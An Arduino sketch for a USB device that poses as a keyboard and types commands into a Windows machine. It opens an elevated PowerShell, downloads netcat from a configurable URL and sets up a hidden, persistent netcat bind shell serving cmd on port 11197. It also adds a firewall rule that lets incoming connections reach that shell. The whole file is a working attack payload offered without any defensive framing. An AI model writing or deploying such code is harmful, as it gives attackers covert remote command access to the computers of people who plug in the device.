#include <esKeyboard.h>

#define defaultDelay 200

String netcaturl = ""; // NETCAT DIRECT LINK DOWNLOAD

void ENTER()
{
  Keyboard.press(KEY_RETURN);
  delay(5);
  Keyboard.release(KEY_RETURN);
}

void setup()
{
  Keyboard.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(defaultDelay);

  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
  ENTER();

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cd %TEMP% && TASKKILL /im nc.exe /f");
  ENTER();
  
  delay(defaultDelay);

  Keyboard.print("powershell rm nc*");
  ENTER();

  delay(defaultDelay);
  
  Keyboard.print("powershell (Invoke-WebRequest -Uri \"");
  Keyboard.print(netcaturl);
  Keyboard.print("\" -OutFile \"nc.exe\")");
  ENTER();

  delay(defaultDelay);

  Keyboard.print("copy con nc.bat");
  ENTER();

  delay(defaultDelay);
  
  Keyboard.print("nc.exe -e cmd -lp 11197 -vv -L");
  ENTER();

  delay(defaultDelay);
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  ENTER();

  delay(defaultDelay);
  
  Keyboard.print("copy con nc.vbs");
  ENTER();

  delay(defaultDelay);
  
  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
  ENTER();
  delay(10);
  Keyboard.print("WshShell.Run chr(34) & \"%TEMP%\\nc.bat\" & Chr(34), 0");
  ENTER();
  delay(10);
  Keyboard.print("Set WshShell = Nothing");
  ENTER();

  delay(defaultDelay);
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  ENTER();

  delay(defaultDelay);

  Keyboard.print("netsh advfirewall firewall add rule name=\"Netcat\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes");
  ENTER();

  delay(defaultDelay);

  Keyboard.print("start nc.vbs && exit");
  ENTER();

}

void loop() { }

